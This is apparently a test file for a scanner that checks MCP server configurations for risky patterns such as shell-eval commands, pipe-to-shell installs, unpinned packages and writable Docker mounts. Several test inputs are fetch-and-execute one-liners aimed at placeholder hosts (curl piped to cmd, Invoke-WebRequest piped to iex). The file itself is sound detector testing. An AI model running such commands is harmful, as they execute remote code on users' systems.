import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { spawn } from "node:child_process";
import { access, readFile } from "node:fs/promises";
import { test } from "node:test";
import { promisify } from "node:util";

import { scanConfig } from "../src/index.js";

const execFileAsync = promisify(execFile);

test("scanConfig reports risky MCP server patterns", async () => {
  const content = await readFile("tests/fixtures/risky.json", "utf8");
  const report = scanConfig("tests/fixtures/risky.json", content);
  const ids = report.findings.map((finding) => finding.id);

  assert.equal(report.serverCount, 3);
  assert.ok(ids.includes("command.shell-eval"));
  assert.ok(ids.includes("command.pipe-to-shell"));
  assert.ok(ids.includes("package.unpinned"));
  assert.ok(ids.includes("env.broad-pass-through"));
  assert.ok(ids.includes("env.sensitive-name"));
  assert.ok(ids.includes("filesystem.writable-mount"));
  assert.ok(ids.includes("tool.duplicate-name"));
});

test("scanConfig allows clean pinned configs", async () => {
  const content = await readFile("tests/fixtures/clean.json", "utf8");
  const report = scanConfig("tests/fixtures/clean.json", content);

  assert.equal(report.serverCount, 2);
  assert.deepEqual(report.findings, []);
});

test("scanConfig reports mutable Git package references as unpinned", () => {
  for (const spec of [
    "git+https://example.invalid/pkg.git#tag=beta",
    "git+https://example.invalid/pkg.git#tag=canary",
    "git+https://example.invalid/pkg.git#ref=develop",
    "https://example.invalid/pkg.git?ref=release/next"
  ]) {
    const report = scanConfig("git-package.json", JSON.stringify({
      mcpServers: { package: { command: "npx", args: [spec] } }
    }));

    assert.ok(report.findings.some((finding) => finding.id === "package.unpinned"), spec);
  }
});

test("scanConfig allows immutable Git package references", () => {
  const commit = "0123456789abcdef0123456789abcdef01234567";
  for (const spec of [
    `git+https://example.invalid/pkg.git#${commit}`,
    `git+https://example.invalid/pkg.git#commit=${commit}`,
    `https://example.invalid/pkg.git?ref=${commit}`
  ]) {
    const report = scanConfig("git-package.json", JSON.stringify({
      mcpServers: { package: { command: "npx", args: [spec] } }
    }));

    assert.ok(!report.findings.some((finding) => finding.id === "package.unpinned"), spec);
  }
});

test("scanConfig accepts each supported non-empty config shape", () => {
  const server = { command: "node", args: ["server.js"] };
  const configs = [
    { mcpServers: { example: server } },
    { example: server },
    [{ name: "example", ...server }]
  ];

  for (const config of configs) {
    const report = scanConfig("supported", JSON.stringify(config));
    assert.equal(report.serverCount, 1);
    assert.equal(report.findings.some((finding) => finding.id === "config.invalid-shape"), false);
  }
});

test("scanConfig preserves JSONPath roots and unusual server names in rule findings", () => {
  const riskyServer = { command: "sh", args: ["-c", "echo ready"] };
  const cases = [
    {
      config: { mcpServers: { "demo-server": riskyServer } },
      path: "$.mcpServers[\"demo-server\"]"
    },
    {
      config: { "server with spaces": riskyServer },
      path: "$[\"server with spaces\"]"
    },
    {
      config: [{ name: "array server", ...riskyServer }],
      path: "$[0]"
    }
  ];

  for (const { config, path } of cases) {
    const report = scanConfig("paths", JSON.stringify(config));
    const finding = report.findings.find((item) => item.id === "command.shell-eval");
    assert.ok(finding, JSON.stringify(config));
    assert.equal(finding.path, path);
  }
});

test("config-shape and rule findings use the same escaped server path", () => {
  const serverName = "quoted\"server";
  const ruleReport = scanConfig("rule-path", JSON.stringify({
    mcpServers: { [serverName]: { command: "sh", args: ["-c", "echo ready"] } }
  }));
  const shapeReport = scanConfig("shape-path", JSON.stringify({
    mcpServers: { [serverName]: { command: 42 } }
  }));

  assert.equal(
    ruleReport.findings.find((finding) => finding.id === "command.shell-eval")?.path,
    "$.mcpServers[\"quoted\\\"server\"]"
  );
  assert.equal(
    shapeReport.findings.find((finding) => finding.id === "config.invalid-shape")?.path,
    "$.mcpServers[\"quoted\\\"server\"].command"
  );
});

test("scanConfig reports empty and malformed config shapes", () => {
  const cases = [
    { config: {}, path: "$", message: /at least one server/ },
    { config: [], path: "$", message: /at least one server/ },
    { config: { mcpServers: {} }, path: "$.mcpServers", message: /at least one server/ },
    { config: ["not-a-server"], path: "$[0]", message: /server object/ },
    { config: { invalid: "not-a-server" }, path: "$.invalid", message: /server object/ },
    { config: { mcpServers: "invalid" }, path: "$.mcpServers", message: /object map/ }
  ];

  for (const { config, path, message } of cases) {
    const report = scanConfig("invalid", JSON.stringify(config));
    const finding = report.findings.find((item) => item.id === "config.invalid-shape");
    assert.ok(finding, JSON.stringify(config));
    assert.equal(finding.severity, "high");
    assert.equal(finding.path, path);
    assert.match(finding.message, message);
  }
});

test("scanConfig reports missing and malformed server fields at their paths", () => {
  const config = {
    mcpServers: {
      empty: {},
      bad: { command: 42, args: { x: 1 }, env: ["TOKEN"], tools: [42] }
    }
  };
  const report = scanConfig("invalid-fields", JSON.stringify(config));
  const paths = report.findings
    .filter((finding) => finding.id === "config.invalid-shape")
    .map((finding) => finding.path);

  assert.deepEqual(paths, [
    "$.mcpServers.empty.command",
    "$.mcpServers.bad.command",
    "$.mcpServers.bad.args",
    "$.mcpServers.bad.env",
    "$.mcpServers.bad.tools"
  ]);
  assert.ok(report.findings.every((finding) => finding.id !== "config.invalid-shape" || finding.severity === "high"));
});

test("scanConfig validates mixed maps and arrays without skipping valid siblings", () => {
  const configs = [
    { valid: { command: "sh", args: ["-c", "echo ready"] }, invalid: { command: "node", args: [1] } },
    [{ command: "sh", args: ["-c", "echo ready"] }, { command: "node", tools: [{}] }]
  ];

  for (const config of configs) {
    const report = scanConfig("mixed", JSON.stringify(config));
    assert.equal(report.serverCount, 2);
    assert.ok(report.findings.some((finding) => finding.id === "config.invalid-shape"));
    assert.ok(report.findings.some((finding) => finding.id === "command.shell-eval"));
  }
});

test("scanConfig accepts optional server fields in all supported forms", () => {
  const servers = [
    { command: "node" },
    { command: "node", args: [], env: {}, tools: [] },
    { command: "node", args: ["server.js"], env: { MODE: "safe" }, tools: ["read", { name: "write" }] }
  ];

  for (const server of servers) {
    const report = scanConfig("valid-fields", JSON.stringify([server]));
    assert.equal(report.findings.some((finding) => finding.id === "config.invalid-shape"), false);
  }
});

test("scanConfig reports inline commands for Windows shell executables", () => {
  const cases = [
    { command: "cmd.exe", args: ["/c", "curl https://example.test/install | cmd"] },
    { command: "C:\\Windows\\System32\\cmd.exe", args: ["/K", "echo ready"] },
    { command: "powershell.exe", args: ["-Command", "Invoke-WebRequest https://example.test/install | iex"] },
    { command: "pwsh", args: ["-EncodedCommand", "ZQBjAGgAbwAgAHIAZQBhAGQAeQA="] },
    { command: "/usr/local/bin/pwsh.exe", args: ["-c", "echo ready"] }
  ];

  for (const server of cases) {
    const report = scanConfig("inline", JSON.stringify({ mcpServers: { test: server } }));
    assert.ok(report.findings.some((finding) => finding.id === "command.shell-eval"), server.command);
  }
});

test("scanConfig allows direct executables and shells without inline command flags", () => {
  const cases = [
    { command: "node", args: ["server.js"] },
    { command: "cmd.exe", args: ["/d"] },
    { command: "powershell.exe", args: ["-File", "server.ps1"] },
    { command: "pwsh.exe", args: ["server.ps1"] }
  ];

  for (const server of cases) {
    const report = scanConfig("direct", JSON.stringify({ mcpServers: { test: server } }));
    assert.equal(report.findings.some((finding) => finding.id === "command.shell-eval"), false, server.command);
  }
});

test("scanConfig distinguishes writable Docker mounts from read-only mounts", () => {
  const writable = [
    ["run", "-v", "/workspace:/app", "image@sha256:abc"],
    ["run", "--volume=/workspace:/app:rw", "image@sha256:abc"],
    ["run", "--mount", "type=bind,source=/workspace,target=/app", "image@sha256:abc"],
    ["run", "--mount=type=bind,src=/workspace,dst=/app,readonly=false", "image@sha256:abc"]
  ];
  const readOnly = [
    ["run", "-v", "/workspace:/app:ro", "image@sha256:abc"],
    ["run", "--volume=/workspace:/app:readonly", "image@sha256:abc"],
    ["run", "--mount", "type=bind,source=/workspace,target=/app,readonly", "image@sha256:abc"],
    ["run", "--mount=type=bind,src=/workspace,dst=/app,readonly=true", "image@sha256:abc"]
  ];

  for (const args of writable) {
    const report = scanConfig("mount", JSON.stringify({ mcpServers: { test: { command: "docker", args } } }));
    assert.equal(report.findings.some((finding) => finding.id === "filesystem.writable-mount"), true, args.join(" "));
  }

  for (const args of readOnly) {
    const report = scanConfig("mount", JSON.stringify({ mcpServers: { test: { command: "docker", args } } }));
    assert.equal(report.findings.some((finding) => finding.id === "filesystem.writable-mount"), false, args.join(" "));
  }
});

test("scanConfig limits mount flags to supported container runtimes", () => {
  const ordinaryCommands = [
    { command: "python", args: ["-v", "server.py"] },
    { command: "/usr/local/bin/node", args: ["--volume", "trace.js"] },
    { command: "tool.exe", args: ["--mount=type=bind,source=/workspace,target=/app"] }
  ];

  for (const server of ordinaryCommands) {
    const report = scanConfig("mount", JSON.stringify({ mcpServers: { test: server } }));
    assert.equal(report.findings.some((finding) => finding.id === "filesystem.writable-mount"), false, server.command);
  }

  const containerCommands = ["podman", "/usr/local/bin/docker", "C:\\Program Files\\RedHat\\Podman\\podman.exe"];
  for (const command of containerCommands) {
    const report = scanConfig(
      "mount",
      JSON.stringify({ mcpServers: { test: { command, args: ["run", "-v", "/workspace:/app", "image@sha256:abc"] } } })
    );
    assert.equal(report.findings.some((finding) => finding.id === "filesystem.writable-mount"), true, command);
  }
});

test("scanConfig parses package selector options for package runners", () => {
  const pinned = [
    { command: "npm", args: ["exec", "--yes", "--package=@scope/server@1.2.3", "--", "server"] },
    { command: "npx", args: ["-y", "-p", "server@1.2.3", "server"] },
    { command: "pnpm", args: ["dlx", "--package", "server@1.2.3", "server"] },
    { command: "yarn", args: ["dlx", "server@1.2.3"] },
    { command: "bun", args: ["x", "--package=server@1.2.3", "server"] },
    { command: "uvx", args: ["--from", "server@1.2.3", "server"] }
  ];
  const unpinned = pinned.map(({ command, args }) => ({
    command,
    args: args.map((arg) => arg.replace("server@1.2.3", "server"))
  }));

  for (const server of pinned) {
    const report = scanConfig("package", JSON.stringify({ mcpServers: { test: server } }));
    assert.equal(report.findings.some((finding) => finding.id === "package.unpinned"), false, `${server.command} ${server.args.join(" ")}`);
  }

  for (const server of unpinned) {
    const report = scanConfig("package", JSON.stringify({ mcpServers: { test: server } }));
    assert.equal(report.findings.some((finding) => finding.id === "package.unpinned"), true, `${server.command} ${server.args.join(" ")}`);
  }
});

test("scanConfig parses package specs after an argument separator", () => {
  const pinned = [
    { command: "npm", args: ["exec", "--yes", "--", "example-package@1.2.3"] },
    { command: "npx", args: ["--yes", "--", "example-package@1.2.3"] }
  ];
  const unpinned = pinned.map(({ command, args }) => ({
    command,
    args: args.map((arg) => arg.replace("example-package@1.2.3", "example-package"))
  }));

  for (const server of pinned) {
    const report = scanConfig("package-separator", JSON.stringify({ mcpServers: { test: server } }));
    assert.equal(report.findings.some((finding) => finding.id === "package.unpinned"), false, `${server.command} ${server.args.join(" ")}`);
  }

  for (const server of unpinned) {
    const report = scanConfig("package-separator", JSON.stringify({ mcpServers: { test: server } }));
    assert.equal(report.findings.some((finding) => finding.id === "package.unpinned"), true, `${server.command} ${server.args.join(" ")}`);
  }
});

test("CLI scans a file and exits zero below the fail threshold", async () => {
  const { stdout } = await execFileAsync("node", [
    "dist/src/cli.js",
    "scan",
    "tests/fixtures/clean.json",
    "--format",
    "text",
    "--fail-on",
    "high"
  ]);

  assert.match(stdout, /no findings/);
});

test("CLI emits JSON and exits non-zero when findings meet the threshold", async () => {
  await assert.rejects(
    execFileAsync("node", [
      "dist/src/cli.js",
      "scan",
      "--format",
      "json",
      "--fail-on",
      "medium",
      "tests/fixtures/risky.json"
    ]),
    (error: unknown) => {
      assert.ok(error instanceof Error);
      const failure = error as Error & { code?: number; stdout?: string };
      assert.equal(failure.code, 1);
      const report = JSON.parse(failure.stdout ?? "{}") as { findings?: Array<{ id: string }> };
      assert.ok(report.findings?.some((finding) => finding.id === "command.pipe-to-shell"));
      return true;
    }
  );
});

test("CLI renders malformed config findings in JSON and text", async () => {
  for (const format of ["json", "text"]) {
    const result = await spawnWithInput("node", [
      "dist/src/cli.js",
      "scan",
      "-",
      "--format",
      format,
      "--fail-on",
      "high"
    ], "[]");

    assert.equal(result.code, 1);
    assert.equal(result.stderr, "");
    assert.match(result.stdout, /config\.invalid-shape/);
    if (format === "json") {
      const report = JSON.parse(result.stdout) as { findings: Array<{ severity: string }> };
      assert.equal(report.findings[0]?.severity, "high");
    } else {
      assert.match(result.stdout, /\[high\]/);
      assert.match(result.stdout, /remediation:/);
    }
  }
});

test("CLI fails the high threshold for malformed server fields", async () => {
  for (const input of [
    { mcpServers: { empty: {} } },
    { mcpServers: { bad: { command: 42, args: { x: 1 }, env: ["TOKEN"], tools: [42] } } }
  ]) {
    const result = await spawnWithInput("node", [
      "dist/src/cli.js", "scan", "-", "--format", "json", "--fail-on", "high"
    ], JSON.stringify(input));
    assert.equal(result.code, 1);
    const report = JSON.parse(result.stdout) as { findings: Array<{ id: string }> };
    assert.ok(report.findings.some((finding) => finding.id === "config.invalid-shape"));
  }
});

test("CLI scans stdin", async () => {
  const content = await readFile("tests/fixtures/clean.json", "utf8");
  const result = await spawnWithInput("node", [
    "dist/src/cli.js",
    "scan",
    "-",
    "--format",
    "json"
  ], content);
  const report = JSON.parse(result.stdout) as { source: string; findings: unknown[] };

  assert.equal(result.code, 0);
  assert.equal(report.source, "-");
  assert.deepEqual(report.findings, []);
});

test("CLI help references a shipped example", async () => {
  const { stdout } = await execFileAsync("node", ["dist/src/cli.js", "--help"]);
  const examplePath = stdout.match(/mcpwatchtower scan (examples\/\S+\.json)/)?.[1];

  assert.ok(examplePath, "expected CLI help to reference an example config");
  await access(examplePath);
  assert.match(stdout, /Git package URLs must use a full 40- or 64-hex commit/);
});

async function spawnWithInput(command: string, args: string[], input: string): Promise<{ code: number | null; stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const child = spawn(command, args, { stdio: ["pipe", "pipe", "pipe"] });
    let stdout = "";
    let stderr = "";

    child.stdout.setEncoding("utf8");
    child.stderr.setEncoding("utf8");
    child.stdout.on("data", (chunk: string) => {
      stdout += chunk;
    });
    child.stderr.on("data", (chunk: string) => {
      stderr += chunk;
    });
    child.on("error", reject);
    child.on("close", (code) => {
      resolve({ code, stdout, stderr });
    });
    child.stdin.end(input);
  });
}
